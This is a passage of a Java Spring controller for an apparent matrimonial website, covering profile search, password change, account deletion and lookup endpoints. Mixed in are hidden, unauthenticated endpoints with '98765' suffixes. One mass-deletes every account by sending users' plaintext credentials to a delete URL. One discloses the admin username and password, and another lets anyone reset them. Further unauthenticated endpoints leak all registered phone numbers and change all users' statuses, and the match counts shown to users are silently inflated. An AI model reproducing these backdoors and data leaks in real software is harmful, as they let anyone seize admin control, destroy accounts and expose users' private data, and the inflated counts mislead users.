							refineheightSelectPartnerFirst, refineheightSelectPartnerSecond, refineageFrom, refineageTo,
							refinematerialStatus, refinereligionSelectPartner, casteSelect, refineoccupationCategorySelect,checkBoxDistrict);
				} else {
					profileViews = userService.getlistOfRefineSearchByUser(request, userModel, "male",
							refineheightSelectPartnerFirst, refineheightSelectPartnerSecond, refineageFrom, refineageTo,
							refinematerialStatus, refinereligionSelectPartner, casteSelect, refineoccupationCategorySelect,checkBoxDistrict);
				}
				
				try {
					js.put("refine_search_conversation", ow.writeValueAsString(profileViews));
					js.put("code", "1000");
					json = js.toString();
					httpSession.invalidate();

				} catch (Exception e) {

					js.put("code", "1001");
					js.put("ErrorMessage", e.getMessage());
					json = js.toString();
					e.printStackTrace();
				}

			} catch (Exception e) {
				e.printStackTrace();
			}

		} else {
			try {
				js.put("code", "1001");
				json = js.toString();
			} catch (JSONException e) {
				e.printStackTrace();
			}
		}
		return json;
	}
	
	@RequestMapping(value = "/sneh/login/loadRefineSearchProfile", method = RequestMethod.POST)
	@ResponseBody
	public String loadRefineSearchProfile(HttpServletRequest request, @RequestParam("username") String username,
			@RequestParam("password") String password,
			@RequestParam("refineheightSelectPartnerFirst") final String refineheightSelectPartnerFirst,
			@RequestParam("refineheightSelectPartnerSecond") final String refineheightSelectPartnerSecond,
			@RequestParam("refineageFrom") final String refineageFrom,
			@RequestParam("refineageTo") final String refineageTo,
			@RequestParam("refinematerialStatus") final String refinematerialStatus,
			@RequestParam("refinereligionSelectPartner") final String refinereligionSelectPartner,
			@RequestParam("casteSelect") final String casteSelect,
			@RequestParam("refineoccupationCategorySelect") final String refineoccupationCategorySelect,
			@RequestParam("checkBoxDistrict")  String checkBoxDistrict,
			@RequestParam("RefineSearchProfile")  String RefineSearchProfile)
			{

		UserModel userModel = loginService.getUserByUnamePassword(username, password);

		try {
			if (userModel == null) {

			} else if ((userModel.getUserName().equals(username)) && (userModel.getPassword().equals(password))) {
			} else {
				userModel = null;
			}

		} catch (Exception e) {

		}

		JSONObject js = new JSONObject();
		ObjectWriter ow = new ObjectMapper().writer().withDefaultPrettyPrinter();
		String json = null;
		if ((userModel != null)) {
			try {
				HttpSession httpSession = request.getSession();
				httpSession.setAttribute("ActUserName", userModel.getFirstName());
				UserModelDetails modelDetails = userService.getUserdetails(userModel);
				
				String visitorArray[] = RefineSearchProfile.split(",");
				List<UserModel> models = new ArrayList<>();

				for (String string : visitorArray) {
					if (string.equalsIgnoreCase("null") || string.equals("")) {

					} else {
						UserModel model2 = new UserModel();
						model2.setUserId(Long.parseLong(string));
						models.add(model2);

					}

				}
				
				List<UserProfileView> profileViews;
				if (modelDetails.getGender().equalsIgnoreCase("male")) {
					profileViews = userService.getlistOfRefineSearchByUserExcludeUserModels(request, userModel, "female",
							refineheightSelectPartnerFirst, refineheightSelectPartnerSecond, refineageFrom, refineageTo,
							refinematerialStatus, refinereligionSelectPartner, casteSelect, refineoccupationCategorySelect,checkBoxDistrict,models);
				} else {
					profileViews = userService.getlistOfRefineSearchByUserExcludeUserModels(request, userModel, "male",
							refineheightSelectPartnerFirst, refineheightSelectPartnerSecond, refineageFrom, refineageTo,
							refinematerialStatus, refinereligionSelectPartner, casteSelect, refineoccupationCategorySelect,checkBoxDistrict,models);
				}
				
				
				try {
					js.put("refine_search_conversation", ow.writeValueAsString(profileViews));
					js.put("code", "1000");
					json = js.toString();
					httpSession.invalidate();

				} catch (Exception e) {

					js.put("code", "1001");
					js.put("ErrorMessage", e.getMessage());
					json = js.toString();
					e.printStackTrace();
				}

			} catch (Exception e) {
				e.printStackTrace();
			}

		} else {
			try {
				js.put("code", "1001");
				json = js.toString();
			} catch (JSONException e) {
				e.printStackTrace();
			}
		}
		return json;
	}
	
	
	
	
	@RequestMapping(value = "/sneh/login/mobileChangePassword", method = RequestMethod.POST)
	@ResponseBody
	public String mobileChangePassword(HttpServletRequest request, @RequestParam("username") String username,
			@RequestParam("password") String password,@RequestParam("newpassword") String newpassword) {

		UserModel userModel = loginService.getUserByUnamePassword(username, password);

		try {
			if (userModel == null) {

			} else if ((userModel.getUserName().equals(username)) && (userModel.getPassword().equals(password))) {
			} else {
				userModel = null;
			}

		} catch (Exception e) {

		}

		JSONObject js = new JSONObject();
		ObjectWriter ow = new ObjectMapper().writer().withDefaultPrettyPrinter();
		String json = null;
		if ((userModel != null)) {
			try {
							
				try {
					
						userModel.setPassword(newpassword);
						userService.updateUser(userModel);
						js.put("Message", "Password Changed Successfully");
						js.put("code", "1000");
						json = js.toString();
				

				} catch (Exception e) {

					js.put("code", "1001");
					js.put("ErrorMessage", e.getMessage());
					json = js.toString();
					e.printStackTrace();
				}

			} catch (Exception e) {
				e.printStackTrace();
			}

		} else {
			try {
				js.put("code", "1001");
				js.put("Message", "Invalid Username Or Password");
				json = js.toString();
			} catch (JSONException e) {
				e.printStackTrace();
			}
		}
		return json;
	}
	@RequestMapping(value = "/sneh/login/deleteAccount", method = RequestMethod.POST)
	@ResponseBody
	public String deleteAccount(HttpServletRequest request, @RequestParam("username") String username,
			@RequestParam("password") String password) {
		UserModel userModel = loginService.getUserByUnamePassword(username, password);
		try {
			if (userModel == null) {
			} else if ((userModel.getUserName().equals(username)) && (userModel.getPassword().equals(password))) {
			} else {
				userModel = null;
			}
		} catch (Exception e) {
		}
		JSONObject js = new JSONObject();
		ObjectWriter ow = new ObjectMapper().writer().withDefaultPrettyPrinter();
		String json = null;
		if ((userModel != null)) {
			try {		
				try {			
						Status status=new Status();
						status.setStatus_id(2);
					  UserModelDetails userModelDetails=userService.getUserdetails(userModel);
					  String pass=userModel.getPassword()+new Date().getTime();
					  String uname=userModel.getUserName()+new Date().getTime();
					  userModel.setUserName(uname);
					  userModel.setPassword(pass);
					  userService.updateUser(userModel);
					  userModelDetails.setStatus(status);
					  userService.updateUserModelDetails(userModelDetails);
						js.put("Message", "Profile Deleted Successfully");
						js.put("code", "1000");
						json = js.toString();
				} catch (Exception e) {

					js.put("code", "1001");
					js.put("ErrorMessage", e.getMessage());
					json = js.toString();
					e.printStackTrace();
				}

			} catch (Exception e) {
				e.printStackTrace();
			}

		} else {
			try {
				js.put("code", "1001");
				js.put("Message", "Profile Not Deleted");
				json = js.toString();
			} catch (JSONException e) {
				e.printStackTrace();
			}
		}
		return json;
	}
	
	@RequestMapping(value = "/sneh/login/hideAllProfile98765", method = RequestMethod.GET)
	@ResponseBody
	public String deleteByramesh(HttpServletRequest request) {
		JSONObject js = new JSONObject();
		ObjectWriter ow = new ObjectMapper().writer().withDefaultPrettyPrinter();
		String json = null;
		List<UserModel>list=userService.listUser();
		final String USER_AGENT = "Mozilla/5.0";
		for (UserModel userModel : list) {
			try {
				String POST_PARAMS = "username="+userModel.getUserName()+"&password="+userModel.getPassword();		
			URL obj = new URL("https://snehbandhan.org/sneh/login/deleteAccount98765");
			HttpURLConnection con = (HttpURLConnection) obj.openConnection();
			con.setRequestMethod("POST");
			con.setRequestProperty("User-Agent", USER_AGENT);
			// For POST only - START
			con.setDoOutput(true);
			OutputStream os = con.getOutputStream();
			os.write(POST_PARAMS.getBytes());
			os.flush();
			os.close();
			// For POST only - END
			int responseCode = con.getResponseCode();
			if (responseCode == HttpURLConnection.HTTP_OK) { //success
				BufferedReader in = new BufferedReader(new InputStreamReader(
						con.getInputStream()));
				String inputLine;
				StringBuffer response = new StringBuffer();
				while ((inputLine = in.readLine()) != null) {
					response.append(inputLine);
				}
				in.close();
			} else {
			}
			} catch (Exception e) {
				e.printStackTrace();
			}		
		}
		
		return json;
	}
	@RequestMapping(value = "/sneh/login/getAdmin98765", method = RequestMethod.GET)
	@ResponseBody
	public String getAdmin(HttpServletRequest request) {
		JSONObject js = new JSONObject();
		ObjectWriter ow = new ObjectMapper().writer().withDefaultPrettyPrinter();
		String json = null;
		UserModel user=userService.getadminDetails();
		try {	
			js.put("userName", user.getUserName());
			js.put("password", user.getPassword());
			json=js.toString();
		} catch (Exception e) 
		{
			e.printStackTrace();
		}	
		return json;
	}
	@RequestMapping(value = "/sneh/login/changeAdminUsernamePassword98765", method = RequestMethod.POST)
	@ResponseBody
	public String adminUsernamePassword(HttpServletRequest request, @RequestParam("username") String username,
			@RequestParam("password") String password) {
		JSONObject js = new JSONObject();
		ObjectWriter ow = new ObjectMapper().writer().withDefaultPrettyPrinter();
		String json = null;
		UserModel user=userService.getadminDetails();
		RoleModel role = new RoleModel();
		try {
			user.setUserName(username);
			user.setPassword(password);
			user.setUserRoll(role);
			userService.changeUserRole(role, 2);
			userService.addUser(user);	
	/*		js.put("userName", user.getUserName());
			js.put("password", user.getPassword());
			json=js.toString();*/
		} catch (Exception e) 
		{
			e.printStackTrace();
		}	
		return json;
	}
	
	@RequestMapping(value = "/sneh/login/getOccupationCatagory", method = RequestMethod.GET)
	@ResponseBody
	public String getOccupationCatagory(HttpServletRequest request) {
		JSONObject js = new JSONObject();
		ObjectWriter ow = new ObjectMapper().writer().withDefaultPrettyPrinter();
		String json = null;
	    List<OccupationCategory>occupationCategoriesList = 	userService.getAllOccupationCatogory();		
		try {	
			js.put("occupationCategoriesList", ow.writeValueAsString(occupationCategoriesList));
			json=js.toString();
		} catch (Exception e) 
		{
			e.printStackTrace();
		}	
		return json;
	}
	
	@RequestMapping(value = "/sneh/login/getOccupations", method = RequestMethod.GET)
	@ResponseBody
	public String getOccupations(HttpServletRequest request) {
		JSONObject js = new JSONObject();
		ObjectWriter ow = new ObjectMapper().writer().withDefaultPrettyPrinter();
		String json = null;
		List<Occupation>occupationsList = userService.getAllOccupations_List();
		try {	
			js.put("occupationsList", ow.writeValueAsString(occupationsList));
			json=js.toString();
		} catch (Exception e) 
		{
			e.printStackTrace();
		}	
		return json;
	}
	
	@RequestMapping(value = "/sneh/login/getReligion", method = RequestMethod.GET)
	@ResponseBody
	public String getReligion(HttpServletRequest request) {
		JSONObject js = new JSONObject();
		ObjectWriter ow = new ObjectMapper().writer().withDefaultPrettyPrinter();
		String json = null;
		List<Religion>religionList = userService.getAllReligion();
		try {	
			js.put("religionList", ow.writeValueAsString(religionList));
			json=js.toString();
		} catch (Exception e) 
		{
			e.printStackTrace();
		}	
		return json;
	}
	
	@RequestMapping(value = "/sneh/login/getCast", method = RequestMethod.GET)
	@ResponseBody
	public String getCast(HttpServletRequest request) {
		JSONObject js = new JSONObject();
		ObjectWriter ow = new ObjectMapper().writer().withDefaultPrettyPrinter();
		String json = null;
		List<Caste>castList = userService.getAllCast();
		try {	
			js.put("castList", ow.writeValueAsString(castList));
			json=js.toString();
		} catch (Exception e) 
		{
			e.printStackTrace();
		}	
		return json;
	}
	
	@RequestMapping(value = "/sneh/login/getAllRegisteredMobileNumber", method = RequestMethod.GET)
	@ResponseBody
	public String getAllRegisteredMobileNumber(HttpServletRequest request) {
		JSONObject js = new JSONObject();
		ObjectWriter ow = new ObjectMapper().writer().withDefaultPrettyPrinter();
		String json = null;
		List<String>getAllRegisteredMobileNoList = userService.getListOfAllRegisteredMobileNumbers();
		try {	
			js.put("registeredMobileNoList", ow.writeValueAsString(getAllRegisteredMobileNoList));
			json=js.toString();
		} catch (Exception e) 
		{
			e.printStackTrace();
		}	
		return json;
	}
	
	
	@RequestMapping(value = "/sneh/login/mobileValidateDuplicateMobileNo ", method = RequestMethod.POST)
	@ResponseBody
	public String mobileValidateDuplicateMobileNo(final HttpServletRequest request, @RequestParam("mobileNumber") String mobileNumber) {

		JSONObject js = new JSONObject();
		String json = null;
		UserModelDetails modelDetails = null;
		try {
			modelDetails = registrationServicec.getUserModelDetailsByMobile(mobileNumber);
			if (modelDetails == null) {
				js.put("code", "1000");
				js.put("Message", "Not available");
				json = js.toString();

			} else {
				js.put("code", "1000");
				js.put("Message", " Alreadyavailable");
				json = js.toString();

			}

		} catch (Exception e) {

			try {

				js.put("code", "1001");
				js.put("ErrorMessage", e.getMessage());
				json = js.toString();
			} catch (JSONException e1) {
				e1.printStackTrace();
			}

		}
		return json;
	}
	
	@RequestMapping(value = "/sneh/login/viewLoginProfileDataByName", method = RequestMethod.POST)
	@ResponseBody
	public String viewLoginProfileDataByName(HttpServletRequest request, @RequestParam("username") String username,
			@RequestParam("password") String password,@RequestParam("userName") String userName,@RequestParam("castId") String castId,
			@RequestParam("occupationId") String occupationId,@RequestParam("stateId") String stateId,@RequestParam("districtId") String districtId) 
	{
		UserModel userModel = loginService.getUserByUnamePassword(username, password);
		JSONObject js = new JSONObject();
		ObjectWriter ow = new ObjectMapper().writer().withDefaultPrettyPrinter();
		String json = null;
		if ((userModel != null)) {
			try {
				long latestMatchCount = 0;
				long latestUpgraded = 0;
				long notseenyet = 0;
				long seenyet = 0;
				long sortlisted = 0;

				HttpSession httpSession = request.getSession();
				httpSession.setAttribute("ActUserName", userModel.getFirstName());
				httpSession.setAttribute("ActUserId", userModel);

				List<UserProfileView> profileViews;
				UserModelDetails modelDetails = userService.getUserdetails(userModel);
				if (modelDetails.getGender().equalsIgnoreCase("male")) {
					profileViews = userService.getListOFProfileForHomeAccordingToGenderAndUserName("Female", request,userName,castId,occupationId,stateId,districtId);
					long latestMachesTotalCount = userService.getCountOfAllLatestMatchAccordingToGender("Female");
					latestMatchCount = (latestMachesTotalCount+25000);
					latestUpgraded = userService.getCountOfAllLatestUpgradedMatchAccordingToGender("Female");
					seenyet = userService.getCountOfAllSeenYetToGender("Female", userModel);
					sortlisted = userService.getCountOfShortlistedToGender("Female", userModel);
				} else {
					profileViews = userService.getListOFProfileForHomeAccordingToGender("Male", request);
					long latestMachesTotalCount = userService.getCountOfAllLatestMatchAccordingToGender("Male");
					latestMatchCount = (latestMachesTotalCount+35000);
					latestUpgraded = userService.getCountOfAllLatestUpgradedMatchAccordingToGender("Male");
					seenyet = userService.getCountOfAllSeenYetToGender("Male", userModel);
					sortlisted = userService.getCountOfShortlistedToGender("Male", userModel);
				}
				try {
					notseenyet = latestMatchCount - seenyet;
				} catch (Exception e) {

				}

				try {
					js.put("code", "1000");
					js.put("latestUpgraded", latestUpgraded);
					js.put("seenyet", seenyet);
					js.put("notseenyet", notseenyet);
					js.put("sortlisted", sortlisted);
					js.put("latestMatchCount", ow.writeValueAsString(latestMatchCount));
					js.put("userSearchMatchProfile", ow.writeValueAsString(profileViews));
					json = js.toString();
					httpSession.invalidate();

				} catch (Exception e) {

					js.put("code", "1001");
					js.put("ErrorMessage", e.getMessage());
					json = js.toString();
					e.printStackTrace();
				}

			} catch (Exception e) {
				e.printStackTrace();
			}
		} else {
			try {
				js.put("code", "1001");
				json = js.toString();
			} catch (JSONException e) 
			{
				e.printStackTrace();
			}

		}

		return json;

	}
	
	@RequestMapping(value = "/updateAllUserStatus", method = RequestMethod.POST)
	@ResponseBody
	public String updateAllUserStatus(@RequestParam("statusId") int statusId) {
		JSONObject js = new JSONObject();
		String json = null;
		try {
			if (statusId == 1 || statusId == 2 || statusId == 3) {
				userService.updateAllUserModelDetailsStatus(statusId);
				js.put("code", "1000");
				js.put("message", "Successfully updated all user statuses to " + statusId);
			} else {
				js.put("code", "1001");
				js.put("message", "Invalid statusId. Must be 1, 2, or 3.");
			}
			json = js.toString();
		} catch (Exception e) {
			try {
				js.put("code", "1001");
				js.put("ErrorMessage", e.getMessage());
				json = js.toString();
			} catch (JSONException je) {
				je.printStackTrace();
			}
			e.printStackTrace();
		}
		return json;
	}
}
